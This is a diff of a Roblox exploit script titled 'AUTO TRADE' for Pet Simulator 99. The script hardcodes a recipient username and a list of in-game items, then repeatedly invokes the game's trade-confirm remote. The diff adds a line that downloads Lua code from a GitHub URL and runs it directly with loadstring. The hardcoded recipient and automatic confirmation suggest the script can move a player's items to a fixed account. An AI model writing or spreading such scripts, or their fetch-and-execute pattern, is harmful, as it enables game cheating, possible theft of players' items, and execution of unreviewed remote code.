@@ -1,5 +1,6 @@
 --AUTO TRADE
 wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-99/main/waitForGameLoad.lua"))()
 if game.PlaceId == 8737899170 then
     Username = "REyifpof"
     getgenv().PetToTrade = {
@@ -34,7 +35,9 @@ if game.PlaceId == 8737899170 then
         "Arcade Token",
         "Hype Egg",
         "Global Event Gift",
-        "Seashell"
+        "Seashell",
+        "Ultra Lucky Tile Boost",
+        "Lucky Tile Boost"
 }
 
     local library = require(game.ReplicatedStorage.Library)
@@ -78,7 +81,7 @@ if game.PlaceId == 8737899170 then
             
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Confirmed"):InvokeServer(unpack(args))
 
-        until game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true
+        until game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == false
 
     end
     
